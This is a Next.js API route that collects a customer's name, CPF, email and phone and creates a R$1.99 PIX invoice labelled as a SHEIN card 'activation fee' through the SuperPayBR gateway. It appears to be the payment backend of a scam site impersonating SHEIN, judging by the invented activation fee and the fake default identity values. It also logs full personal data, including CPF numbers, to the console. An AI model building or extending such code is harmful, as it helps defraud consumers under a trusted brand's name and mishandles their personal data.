import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🔓 === CRIANDO FATURA DE ATIVAÇÃO SUPERPAYBR (BASIC AUTH) ===")

    const body = await request.json()
    console.log("📥 Dados recebidos:", JSON.stringify(body, null, 2))

    const amount = 1.99 // Valor fixo para ativação
    const cpfData = body.customerData || {}
    const userEmail = body.customerData?.email || ""
    const userWhatsApp = body.customerData?.phone || ""

    // Gerar External ID único para ativação
    const externalId = `ACTIVATION_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    console.log("📋 Dados da ativação:", {
      externalId,
      amount,
      customerName: cpfData.nome || "Cliente SHEIN",
      email: userEmail,
    })

    // Credenciais SuperPayBR
    const token = process.env.SUPERPAY_TOKEN
    const secretKey = process.env.SUPERPAY_SECRET_KEY
    const apiUrl = process.env.SUPERPAY_API_URL

    if (!token || !secretKey || !apiUrl) {
      return NextResponse.json(
        {
          success: false,
          error: "Credenciais SuperPayBR não configuradas",
        },
        { status: 500 },
      )
    }

    // Fazer autenticação Basic Auth
    const credentials = `${token}:${secretKey}`
    const base64Credentials = Buffer.from(credentials).toString("base64")

    let accessToken = null

    try {
      const authResponse = await fetch(`${apiUrl}/auth`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          Authorization: `Basic ${base64Credentials}`,
        },
        body: JSON.stringify({
          grant_type: "client_credentials",
        }),
      })

      if (authResponse.ok) {
        const authData = await authResponse.json()
        accessToken = authData.access_token || authData.token
      } else {
        const errorText = await authResponse.text()
        return NextResponse.json(
          {
            success: false,
            error: "Falha na autenticação para ativação",
            details: errorText,
          },
          { status: 401 },
        )
      }
    } catch (error) {
      return NextResponse.json(
        {
          success: false,
          error: "Erro na autenticação para ativação",
          details: error instanceof Error ? error.message : "Erro desconhecido",
        },
        { status: 500 },
      )
    }

    if (!accessToken) {
      return NextResponse.json(
        {
          success: false,
          error: "Access token não obtido para ativação",
        },
        { status: 401 },
      )
    }

    // Dados da fatura de ativação
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: (cpfData.cpf || "00000000000").replace(/\D/g, ""),
        email: userEmail || "cliente@shein.com",
        phone: (userWhatsApp || "11999999999").replace(/\D/g, ""),
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        external_id: externalId,
        type: "pix",
        due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        description: "Ativação do Cartão SHEIN - Taxa de Ativação",
        amount: amount,
        webhook_url: process.env.SUPERPAY_WEBHOOK_URL,
        return_url: `${request.nextUrl.origin}/activation/success`,
        cancel_url: `${request.nextUrl.origin}/activation`,
      },
    }

    console.log("🚀 Criando fatura de ativação com Bearer token...")

    const createUrls = [`${apiUrl}/invoices`, `${apiUrl}/payment`, `${apiUrl}/create`]

    let createSuccess = false
    let responseData = null

    for (const createUrl of createUrls) {
      try {
        const createResponse = await fetch(createUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify(invoiceData),
        })

        if (createResponse.ok) {
          responseData = await createResponse.json()
          createSuccess = true
          break
        }
      } catch (error) {
        console.log(`❌ Erro em ${createUrl}:`, error)
      }
    }

    if (!createSuccess) {
      return NextResponse.json(
        {
          success: false,
          error: "Falha ao criar fatura de ativação",
        },
        { status: 500 },
      )
    }

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""
    let invoiceId = ""

    const findPixData = (obj: any, depth = 0): void => {
      if (!obj || typeof obj !== "object" || depth > 10) return

      for (const [key, value] of Object.entries(obj)) {
        if ((key === "id" || key === "invoice_id") && typeof value === "string" && !invoiceId) {
          invoiceId = value
        }

        if (
          (key === "payload" || key === "pix_code" || key === "qrcode" || key === "pix_payload") &&
          typeof value === "string" &&
          value.length > 50
        ) {
          pixPayload = value
        }

        if ((key === "qrcode_image" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
        }

        if (typeof value === "object" && value !== null) {
          findPixData(value, depth + 1)
        }
      }
    }

    findPixData(responseData)

    invoiceId = invoiceId || responseData.data?.id || responseData.id || externalId

    if (!pixPayload) {
      return NextResponse.json(
        {
          success: false,
          error: "PIX payload não encontrado para ativação",
          response_data: responseData,
        },
        { status: 500 },
      )
    }

    const qrCodeUrl =
      qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    const response = {
      success: true,
      data: {
        id: invoiceId,
        invoice_id: invoiceId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "activation",
      },
    }

    console.log("✅ Fatura de ativação criada com sucesso (BASIC AUTH)!")
    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura de ativação:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura de ativação",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}
